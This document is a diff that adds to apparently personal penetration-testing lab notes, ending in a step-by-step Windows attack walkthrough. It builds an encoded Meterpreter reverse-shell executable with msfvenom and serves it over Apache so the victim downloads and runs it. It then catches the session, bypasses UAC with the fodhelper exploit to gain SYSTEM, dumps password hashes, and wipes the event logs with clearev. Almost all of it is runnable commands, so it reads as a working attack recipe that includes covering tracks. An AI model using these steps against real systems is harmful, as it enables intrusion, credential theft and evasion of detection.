@@ -9,7 +9,7 @@ kali linux > john /usr/share/responder/logs/<log-file> [note the cracked passwor
 (If john is not installed then :-  sudo snap install john-the-ripper )
 ----END----
 
------------Exploiting Client Side Vulnerabilities and Establishing a VNC session-----------
+----------- Gaining Access ---- Exploiting Client Side Vulnerabilities and Establishing a VNC session-----------
 [Creates malicious payload]
 Kali Linux > msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<IP_add_kali_Machine> LPORT=444 -o /root/Desktop/Test.exe 
 
@@ -45,3 +45,69 @@ check if there is any session that are opened in the Meterpreter Shell
 meterpreter > sysinfo [should show the target systems information]
 meterpreter > run vnc [kick starts remote session]
 ------------ END -------------------------------------------
+
+------ Escalating Privileage----------------------------------
+To create the malicious executable file, type this command and put your Kali IP address on LHOST option:
+> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<kali_ip> -f exe > Desktop/Exploit.exe
+
+Create a new directory inside html folder:
+mkdir /var/www/html/share/
+
+Change the mode for the share to 755:
+chmod -R 755 /var/www/html/share/
+
+Change the ownership of that folder to www-data:
+chown -R www-data:www-data /var/www/html/share/
+cp /root/Desktop/Exploit.exe /var/www/html/share/
+
+Start the apache service to run the http server:
+service apache2 start
+
+Perform Exploitation
+-----
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST <kali_ip>
+
+Start the exploit on background:
+
+exploit -j -z
+
+~~Switch to Windows Machine
+open firefox http://<kali_ip>/share , download the Exploit.exe and run
+
+~~Switch back to Kali Machine
+meterpreter > sessions -i [to list the current sessions opened]
+meterpreter > sessions <ID> [select the sessionID]
+getuid
+run post/windows/gather/smart_hashdum  [[-] Insufficient privileges to dump hashes!]
+
+Try to escalate the privileges by issuing a getsystem command that attempts to elevate the user privileges.
+getsystem -t 1 [priv_elevate_getsystem: Operation failed: Access is denied.]
+
+Perform Previlege Escalation
+--------
+Move the current Meterpreter session to the background
+meterpreter> background  
+
+Use the bypassuac_fodhelper exploit for Windows:
+> use exploit/windows/local/bypassuac_fodhelper
+
+> sessions [fetch Session ID]
+> set SESSION <ID>
+> run
+meterpreter > getsystem -i 1
+
+meterpreter > getuid  [Server username: NT AUTHORITY\SYSTEM]
+> run post/windows/gather/smart_hashdump
+> clearev [Clear logs]
+---------------------------END-----------------
+
+
+
+
+
+
+
